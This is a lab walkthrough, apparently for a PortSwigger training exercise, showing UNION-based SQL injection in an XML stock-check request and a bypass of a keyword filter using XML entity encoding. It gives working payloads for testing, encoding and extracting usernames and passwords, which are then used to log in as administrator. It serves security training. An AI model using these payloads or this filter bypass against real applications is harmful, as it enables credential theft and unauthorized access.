# 📝 Lab: SQL Injection with Filter Bypass via XML Encoding

* **Vulnerability:** SQL Injection
* **Difficulty:** PRACTITIONER
* **Objective:** Log in as the `administrator` user.

> **Description**
>
> This lab contains a SQL injection vulnerability in the stock check feature. The results of the SQL query are reflected in the application's response, making it possible to perform a UNION-based SQL injection attack.
>
> The database contains a `users` table that stores usernames and passwords for registered users.
>
> The goal is to bypass the application's input filter using XML encoding, extract the administrator's credentials, and then log in as the `administrator` user.

---

## 🛠️ Tools Used

* Browser + FoxyProxy
* Burp Suite
* Hackvertor (Burp Extension)

---

## 🐾 Steps to Reproduce

### 1. Intercept the Stock Check Request

Open the lab homepage and navigate to:

```text
View Details → Check Stock
```

Intercept the request using **Burp Suite**.

Right-click the request and send it to **Repeater** (`Ctrl + R`).

---

### 2. Identify the Injection Point

Inside the request body, you'll find XML data similar to:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>1</storeId>
</stockCheck>
```

The vulnerable parameter is:

```xml
<storeId></storeId>
```

First, send the request normally and observe the response.

Then try a simple arithmetic expression:

```xml
<storeId>1+1</storeId>
```

If the application evaluates the expression and returns a different result, it's a strong indicator that the input is being processed by the backend SQL query.

---

### 3. Test UNION Injection

Try the following payload:

```sql
UNION SELECT NULL
```

Example:

```xml
<storeId>1 UNION SELECT NULL</storeId>
```

The application responds with something similar to:

```text
Attack detected
```

This indicates that a filter or WAF is blocking common SQL injection keywords.

---

### 4. Install Hackvertor

To bypass the filter, install **Hackvertor** from the Burp Suite BApp Store.

Navigate to:

```text
Extensions → BApp Store
```

Search for:

```text
Hackvertor
```

Install the extension and wait for it to finish loading.

---

### 5. Encode the Payload

Return to the intercepted request.

Highlight your SQL payload, then:

```text
Right Click
→ Extensions
→ Hackvertor
→ Encode
→ dec_entities
```

or

```text
Right Click
→ Extensions
→ Hackvertor
→ Encode
→ hex_entities
```

You can also experiment with other encoders depending on the filter behavior.

The goal is to transform SQL keywords into XML entities while keeping them valid after XML parsing.

For example:

```sql
UNION SELECT NULL
```

may become:

```xml
&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;
```

After encoding, resend the request.

If successful, the application will process the payload and display:

```text
NULL
```

in the response.

---

### 6. Extract User Credentials

Once the filter is bypassed and UNION injection works, retrieve user credentials with:

```sql
UNION SELECT username || '~' || password FROM users
```

After applying XML encoding, place the payload inside the vulnerable parameter:

```xml
<storeId>1 UNION SELECT username || '~' || password FROM users</storeId>
```

The response will contain values similar to:

```text
administrator~password123
wiener~secretpass
carlos~mypassword
```

Locate the administrator account and copy its password.

---

### 7. Log In as Administrator

Go to the login page and authenticate using:

```text
Username: administrator
Password: <retrieved_password>
```

---

### 8. Verify the Solution

After a successful login, the lab will be marked as solved and the **"Lab Solved"** banner will appear.

---

## 💣 Payload

### Basic Input Validation Test

```xml
<storeId>1+1</storeId>
```

**Purpose:**

* Verifies whether user input affects the backend query.
* Helps confirm that the parameter is being interpreted dynamically.

---

### Initial UNION Test

```sql
UNION SELECT NULL
```

**Purpose:**

* Identifies whether UNION-based SQL injection is possible.
* Triggers the application's keyword filter.

---

### Encoded UNION Payload

```sql
UNION SELECT NULL
```

Encoded using Hackvertor:

```xml
&#85;&#78;&#73;&#79;&#78;&#32;&#83;&#69;&#76;&#69;&#67;&#84;&#32;&#78;&#85;&#76;&#76;
```

**Purpose:**

* Bypasses keyword-based filtering.
* Allows the payload to be decoded by the XML parser before reaching the database.

---

### Credential Extraction Payload

```sql
UNION SELECT username || '~' || password FROM users
```

**Purpose:**

* Retrieves usernames and passwords from the `users` table.
* Uses `~` as a separator to make parsing easier.
* Exposes administrator credentials directly in the response.

---

### Example XML Request

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>
        UNION SELECT username || '~' || password FROM users
    </storeId>
</stockCheck>
```

**Expected Result:**

```text
administrator~<password>
```

---

## 🎯 Impact

This vulnerability allows attackers to bypass input filtering mechanisms and execute arbitrary SQL queries against the backend database.

A successful attacker could:

* Bypass XML-based input filters using entity encoding.
* Perform UNION-based SQL injection attacks.
* Enumerate database structures and table contents.
* Retrieve usernames and passwords from the database.
* Gain unauthorized access to administrator accounts.
* Access sensitive customer or business data.
* Escalate privileges within the application.
* Potentially compromise the entire application depending on database permissions.

**Risk:** High

**Attack Complexity:** Low

**Privileges Required:** None

**Potential Business Impact:**

Although the application attempts to block SQL injection using keyword filtering, XML entity encoding completely bypasses the protection. An attacker can extract sensitive data, compromise privileged accounts, and potentially gain full control over application functionality.

---

## 🔗 Reference

For more SQL injection payloads and database-specific syntax, check out the **[PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)**
